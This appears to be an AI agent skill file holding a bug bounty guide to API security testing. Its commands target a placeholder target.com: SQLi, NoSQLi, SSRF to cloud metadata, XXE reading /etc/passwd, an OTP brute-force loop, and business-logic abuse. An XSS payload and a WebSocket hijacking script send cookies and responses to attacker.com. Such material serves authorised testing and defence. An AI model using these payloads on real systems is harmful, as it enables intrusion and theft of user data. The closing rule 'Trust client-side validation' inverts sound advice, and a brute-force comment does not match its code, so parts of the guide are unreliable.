---
name: api-testing-guide
description: API security testing guide for bug bounty hunters. Covers REST API testing, GraphQL testing, authentication testing, authorization testing, rate limiting, input validation, and common API vulnerabilities. Use when testing REST APIs, GraphQL endpoints, or any HTTP API. Chinese trigger: API安全、API测试、REST API、GraphQL测试、API漏洞
---

# API Testing Guide

Complete API security testing methodology.

---

## API TESTING PHILOSOPHY

```
API TESTING LIFECYCLE:
1. DISCOVER — Find all API endpoints
2. ANALYZE — Understand API structure and auth
3. MAP — Document endpoints, parameters, schemas
4. TEST — Run security tests per endpoint
5. CHAIN — Combine API vulns for impact
6. EXPLOIT — Prove findings with PoC
```

### API Types in Bug Bounty

```
REST APIs (most common):
- JSON over HTTP
- Standard HTTP methods (GET/POST/PUT/DELETE/PATCH)
- Status codes (200, 201, 400, 401, 403, 404, 500)
- Common in: modern web apps, mobile APIs, SPAs

GraphQL (growing):
- Single endpoint (usually /graphql)
- Queries and mutations
- Introspection (often enabled)
- Complex nested data

SOAP (enterprise):
- XML-based
- WSDL files
- Often in banking/government

WebSocket (real-time):
- Persistent connection
- Message-based protocol
- Common in: chat apps, notifications, trading
```

---

## REST API TESTING

### REST API Fundamentals

```http
# Standard REST concepts:
# - Resources identified by URLs
# - Actions identified by HTTP methods
# - States in status codes

GET    /api/users          → List users
GET    /api/users/123      → Get specific user
POST   /api/users          → Create user
PUT    /api/users/123      → Update user (full)
PATCH  /api/users/123      → Update user (partial)
DELETE /api/users/123      → Delete user
```

### REST API Authentication Testing

```bash
# Missing auth on protected endpoint
curl -sk https://target.com/api/v1/users

# Empty/invalid token
curl -sk https://target.com/api/v1/users -H "Authorization: Bearer"
curl -sk https://target.com/api/v1/users -H "Authorization: Bearer invalid_token"
curl -sk https://target.com/api/v1/users -H "Authorization:"

# Use another user's token
# Use expired token (some APIs still accept)
```

### REST API Authorization Testing (IDOR)

```
Test pattern for each endpoint:
1. GET /api/users/me (own data)
2. Change ID to another user
3. GET /api/users/456 (other user's data)
4. Check if response contains sensitive data

Variations:
- Numeric IDs: 1 → 2
- UUIDs: Replace with other user's UUID
- Parameters in body: {"userId": 456}
- Header: X-User-ID: 456
- Cookie: user_id=456
```

```bash
# IDOR testing with curl
USER_ID=1
VICTIM_ID=2
TOKEN=attacker_token

curl -sk https://target.com/api/users/$USER_ID \
  -H "Authorization: Bearer $TOKEN"
curl -sk https://target.com/api/users/$VICTIM_ID \
  -H "Authorization: Bearer $TOKEN"
curl -sk -X POST https://target.com/api/users/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"userId": '$VICTIM_ID'}'
```

### REST API Input Validation

```bash
# SQLi
curl -sk "https://target.com/api/users?id=1'"
curl -sk "https://target.com/api/users?id=1' OR 1=1--"
curl -sk "https://target.com/api/users?id=1' AND SLEEP(5)--"

# NoSQLi
curl -sk -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# SSRF
curl -sk -X POST https://target.com/api/analyze \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
curl -sk -X POST https://target.com/api/webhook \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:6379"}'

# XXE
curl -sk -X POST https://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# SSTI
curl -sk -X POST https://target.com/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{7*7}}"}'
```

### REST API Rate Limit Testing

```bash
# Simple rate limit test
for i in $(seq 1 200); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}')
  echo "Request $i: HTTP $code"
done

# Brute-force with rotating sessions
for otp in $(seq -w 000000 999999); do
  curl -sk -X POST "https://target.com/api/verify-otp" \
    -H "Content-Type: application/json" \
    -d "{\"otp\": \"$otp\"}"
done
```

---

## GRAPHQL TESTING

### GraphQL Introspection

```graphql
# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types { name kind fields { name type { name } } }
  }
}

# Send via curl:
curl -sk -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query IntrospectionQuery { __schema { ... } }"}'
```

### GraphQL IDOR Testing

```graphql
# Find node() query from introspection
query {
  node(id: "VXNlcjox") {
    ... on User {
      id
      username
      email
      privateNotes
      role
      password
    }
  }
}

# Brute-force node IDs
# VXNlcjox = User:1
# VXNlcjoy = User:2
```

### GraphQL Batching Attacks

```graphql
# Mass mutation (bypass rate limits)
mutation {
  m1: addToCart(userId: "1", productId: "1", qty: 999) { success total }
  m2: addToCart(userId: "2", productId: "1", qty: 999) { success total }
  m3: addToCart(userId: "3", productId: "1", qty: 999) { success total }
  # ... 100 mutations in one request
}
```

---

## WEBSOCKET TESTING

### WebSocket Security Testing

```bash
# wscat for manual testing
wscat -c "wss://target.com/ws"

# Test origin validation
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"

# Test without auth
wscat -c "wss://target.com/ws"
> {"action": "getProfile", "userId": "1"}
```

### WebSocket Injection

```json
// XSS via WebSocket
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi via WebSocket
{"action": "search", "query": "' OR 1=1--"}

// NoSQLi via WebSocket
{"username": {"$ne": null}, "password": {"$ne": null}}

// SSRF via WebSocket
{"action": "fetch", "url": "http://169.254.169.254/latest/meta-data/"}
```

### WebSocket CSRF (CSWSH)

```html
<!-- Host on attacker.com -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser sends victim's cookies automatically
ws.onopen = () => ws.send(JSON.stringify({action: "getProfile", "userId": "1"}));
ws.onmessage = (e) => fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
</script>
```

---

## API ERROR HANDLING

### Error Information Disclosure

```bash
# Test for verbose error messages
curl -sk "https://target.com/api/users/invalid-id"
curl -sk "https://target.com/api/users/999999999"
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name": "", "email": "invalid"}'

# With invalid content types
curl -sk "https://target.com/api/users" \
  -H "Content-Type: text/plain" -d "invalid"

# With malformed JSON
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{invalid json}'

# Look for:
# - Stack traces
# - Database error messages
# - Internal IPs
# - Framework versions
# - File paths
```

---

## API BUSINESS LOGIC

```bash
# Price manipulation
curl -sk -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "price": -100}]}'

# Negative quantity
curl -sk -X POST "https://target.com/api/cart" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": -1}]}'

# Coupon stacking
curl -sk -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"coupons": ["SAVE10", "SAVE20", "SAVE30"]}'

# Race conditions
seq 1 50 | xargs -P50 -I{} curl -sk -X POST "https://target.com/api/cart/coupon" \
  -H "Content-Type: application/json" \
  -d '{"coupon": "ONETIME_ONLY"}'

# Workflow skip
curl -sk -X POST "https://target.com/api/checkout/confirm" \
  -H "Content-Type: application/json" \
  -d '{"agreed": true}'
```

---

## API SECURITY CHECKLIST

```
Per Endpoint:
[ ] Missing auth test
[ ] Empty/invalid token test
[ ] IDOR with +1 ID
[ ] IDOR with UUID swap
[ ] Parameter in body/path/header test
[ ] SQLi test
[ ] NoSQLi test (if JSON)
[ ] SSRF test (if URL param)
[ ] Mass assignment (if PUT/PATCH)
[ ] Rate limit test
[ ] Race condition (if financial)
[ ] Error message inspection
```

---

## COMMON API VULNERABILITIES

| Vulnerability | Rate | Fix | Test |
|--------------|------|-----|------|
| BOLA/IDOR | 20-40% | Verify owner | Change IDs |
| Broken auth | 15-25% | Validate token | No/empty token |
| Excessive data exposure | 10-15% | Filter response | Inspect response |
| Mass assignment | 5-10% | Whitelist fields | Add admin fields |
| Missing rate limit | 5-10% | Rate limiter | Burst requests |

---

## FINAL API TESTING RULES

1. Always test auth bypass (missing auth = #1 API vuln)
2. Use two accounts (IDOR testing requires cross-user access)
3. Check all HTTP methods (GET/POST/PUT/DELETE/PATCH)
4. Test all API versions (/v1, /v2 often differ)
5. Trust client-side validation (APIs accept anything)
6. Check batch endpoints (mass exposure)
7. Inspect error messages (verbose = info disclosure)
8. Automate (ffuf, nuclei, Burp Intruder)
9. Chain findings (auth bypass + admin endpoint)
10. Document request/response for every finding
